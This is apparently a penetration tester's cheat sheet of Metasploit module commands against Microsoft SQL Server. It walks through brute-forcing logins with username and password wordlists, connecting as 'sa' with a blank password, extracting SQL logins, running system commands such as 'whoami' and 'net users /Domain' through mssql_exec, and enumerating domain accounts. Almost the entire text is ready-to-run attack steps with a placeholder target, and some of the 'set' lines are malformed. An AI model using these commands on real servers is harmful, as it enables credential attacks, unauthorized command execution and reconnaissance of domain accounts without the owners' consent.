#SQL 

#brute force with password lists
msfconsole
use auxiliary/scanner/mssql/mssql_login
set rhost IP
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false
exploit

#Connect with sa and blank password
msfconsole
use auxiliary/scanner/mssql/mssql_enum
set rhost IP
exploit

#extract sql logins
msfconsole
use auxiliary/scanner/mssql/mssql_enum_sql_logins
set rhost IP
exploit

#execute command on
use auxiliary/admin/mssql/mssql_exec
set RHOSTS IP
set CMD whoami
set cmd dir c:\
set net users 
set "net users /Domain"
exploit

#list all domain accounts
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS IP
exploit
